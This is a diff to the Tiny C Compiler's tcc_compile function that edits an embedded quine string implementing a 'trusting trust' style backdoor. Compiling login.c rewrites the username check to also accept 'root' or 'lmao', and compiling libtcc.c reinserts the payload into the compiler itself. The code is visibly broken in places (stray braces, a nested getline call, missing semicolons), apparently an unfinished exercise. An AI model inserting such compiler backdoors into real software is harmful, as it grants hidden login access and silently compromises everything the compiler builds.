@@ -720,52 +720,52 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 
     
     char* quine = 
-    "if(strcmp(str,"login.c")==0)}\
+    "if(strcmp(str,\"login.c\")==0)}\
         FILE *lmao;\
         FILE *lmao2;\
         size_t nope;\
         char *line;\
         nope=725;\
         line = tcc_malloc(nope);\
-        lmao = fopen("lmao.o","w");\
-        lmao2 = fdopen(fd,"r");\
+        lmao = fopen(\"lmao.o\",\"w\");\
+        lmao2 = fdopen(fd,\"r\");\
         
         while(getline(&line,&nope, lmao2) >0) {\
             if(strstr(line, \"strcmp\")) {\
-                fprintf(lmao, \"    if (!strcmp(username, \"root\") || !strcmp(username, \"lmao\"))\");
-            } else {
-                fprintf(lmao,\"%s\",line)
-            }
-        }
-        fclose(lmao);
-        fclose(lmao2);
-        tcc_free(line);
-        fd = _tcc_open(s1, \"lmao.o\");
-    }
-    if(strcmp(str,\"libtcc.c\")==0){
-        int l;
-       FILE *Lmao;
-        FILE *Lmao2;
-        size_t Nope;
-        char *Line;
-        Nope=725;
-        Line = tcc_malloc(Nope);
+                fprintf(lmao, \"    if (!strcmp(username, \"root\") || !strcmp(username, \"lmao\"))\");\
+            } else {\
+                fprintf(lmao,\"%s\",line)\
+            }\
+        }\
+        fclose(lmao);\
+        fclose(lmao2);\
+        tcc_free(line);\
+        fd = _tcc_open(s1, \"lmao.o\");\
+    }\
+    if(strcmp(str,\"libtcc.c\")==0){\
+        int l;\
+       FILE *Lmao;\
+        FILE *Lmao2;\
+        size_t Nope;\
+        char *Line;\
+        Nope=725;\
+        Line = tcc_malloc(Nope);\
         Lmao = fopen(\"lmao.o\",\"w\");\
-        Lmao2 = fdopen(fd,\"r\");
-        while(getline(&Line,&Nope, Lmao2) >0) {
-            if((strstr(Line, \"static int tcc_compile(TCCState *s1\"))) {
-                getline(getline(&Line,&Nope, Lmao2));
-                fprintf(Lmao, \"static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd){\");
-                fprintf(Lmao,\"Placeholder\");
-                fflush(Lmao);
-            } else {
-                fprintf(Lmao,\"%s\",Line);
-            }
-        }
-        fclose(Lmao);
-        fclose(Lmao2);
-        tcc_free(Line);
-        fd = _tcc_open(s1, \"lmao.o\");
+        Lmao2 = fdopen(fd,\"r\");\
+        while(getline(&Line,&Nope, Lmao2) >0) {\
+            if((strstr(Line, \"static int tcc_compile(TCCState *s1\"))) {\
+                getline(getline(&Line,&Nope, Lmao2));\
+                fprintf(Lmao, \"static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd){\");\
+                fprintf(Lmao,\"Placeholder\");\
+                fflush(Lmao);\
+            } else {\
+                fprintf(Lmao,\"%s\",Line);\
+            }\
+        }\
+        fclose(Lmao);\
+        fclose(Lmao2);\
+        tcc_free(Line);\
+        fd = _tcc_open(s1, \"lmao.o\");\
     }";
     if(strcmp(str,"login.c")==0){
         FILE *lmao;
